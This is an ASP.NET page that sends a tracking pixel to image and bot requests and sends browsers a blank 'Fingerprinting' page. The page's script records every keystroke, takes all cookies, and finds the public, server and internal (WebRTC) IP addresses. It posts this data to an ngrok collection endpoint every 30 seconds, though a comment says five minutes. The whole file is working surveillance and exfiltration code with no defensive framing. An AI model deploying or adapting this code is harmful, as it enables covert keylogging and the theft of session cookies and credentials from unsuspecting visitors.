<%@ Page Language="C#" AutoEventWireup="true" CodeBehind="submit.aspx.cs" Inherits="YourNamespace.submit" %>

<%-- Server-side ASP.NET code to determine request type --%>
<%
    // Check if the request is coming from an image request
    string userAgent = Request.UserAgent.ToLower();
    string acceptHeader = Request.Headers["Accept"];

    bool isImageRequest = acceptHeader.Contains("image") || userAgent.Contains("bot");

    if (isImageRequest)
    {
        // Serve a 1x1 transparent image if it's an image request
        Response.ContentType = "image/png";
        byte[] pixel = new byte[] { 0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A, 0x00, 0x00, 0x00, 0x0D, 0x49, 0x48, 0x44, 0x52, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x08, 0x06, 0x00, 0x00, 0x00, 0x1F, 0x15, 0xC4, 0x89, 0x00, 0x00, 0x00, 0x00, 0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82 };
        Response.BinaryWrite(pixel);
        Response.End();
    }
    else
    {
        // Serve a blank page with fingerprinting JavaScript if it's a browser request
        Response.ContentType = "text/html";
%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fingerprinting Page</title>
</head>
<body>
    <h1>Fingerprinting...</h1>
    <script>
    (function() {
  'use strict';
  const keys = [];
  const collectedData = {
    name: null,
    keystrokes: [],
    url: window.location.href,
    confirmed: true,
    textInput: null,
    cookies: {},
    ipAddress: null, // Client IP address
    serverIp: null, // Server IP address
    internalIp: null // Internal IP address
  };

  function sendData(data) {
    const endpoint = 'https://native-fully-elephant.ngrok-free.app/collect';
    fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify(data)
    }).catch(err => console.error('Data send error:', err));
  }

  function handleKeyDown(event) {
    const key = event.key || String.fromCharCode(event.keyCode);
    keys.push(key);
    collectedData.keystrokes = keys;
    console.log('Keys:', collectedData.keystrokes);
  }

  function getCookie() {
    if (document.cookie.length > 0) {
      const cookies = document.cookie.split(';');
      if (cookies.length > 0) {
        return cookies.reduce((obj, text) => {
          const fragment = text.split('=');
          if (fragment.length > 1) {
            return Object.assign(obj, {
              [fragment[0].trim()]: unescape(fragment.splice(1).join("").trim()),
            });
          }
          return obj;
        }, {});
      }
    }
    return {};
  }

  function fetchServerIp() {
    const domain = window.location.hostname; // Get the current domain

    fetch(`https://dns.google/resolve?name=${domain}&type=A`)
      .then(response => response.json())
      .then(data => {
        if (data.Answer && data.Answer.length > 0) {
          const serverIp = data.Answer[0].data;
          collectedData.serverIp = serverIp;
          console.log('Server IP Address:', serverIp);

          // Send the collected data to the server once IP is obtained
          sendData(collectedData);
        } else {
          console.log('No IP address found for the domain.');
        }
      })
      .catch(err => console.error('Server IP fetch error:', err));
  }

  function fetchIPAddress() {
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        collectedData.ipAddress = data.ip;
        console.log('IP Address:', collectedData.ipAddress);

        // Send the collected data to the server once IP is obtained
        sendData(collectedData);
      })
      .catch(err => console.error('IP fetch error:', err));
  }

  function getInternalIP(callback) {
    const rtc = new RTCPeerConnection({ iceServers: [] });
    rtc.createDataChannel('');
    rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
    
    rtc.onicecandidate = (event) => {
      if (!event.candidate) {
        rtc.close();
        return;
      }
      const candidate = event.candidate.candidate;
      console.log('ICE Candidate:', candidate); // Debug log
      const match = /([0-9]{1,3}\.){3}[0-9]{1,3}/.exec(candidate);
      if (match) {
        callback(match[0]);
      }
    };

    // Handle RTC errors
    rtc.onerror = (error) => {
      console.error('RTC Error:', error);
    };
  }

  document.addEventListener('keydown', handleKeyDown);

  collectedData.cookies = getCookie(); // Capture cookies
  console.log('Persisted Value:', collectedData.name);

  // Fetch IP address and server IP address, and send data
  fetchIPAddress();
  fetchServerIp();
  
  // Fetch internal IP address
  getInternalIP(internalIP => {
    collectedData.internalIp = internalIP;
    console.log('Internal IP Address:', internalIP);
    
    // Send the collected data to the server once internal IP is obtained
    sendData(collectedData);
  });

  // Set up interval to send data every 5 minutes
  setInterval(() => {
    sendData(collectedData);
  }, 30000); // 300000 milliseconds = 5 minutes
})();
  </script>
</body>
</html>
<%
    }
%>
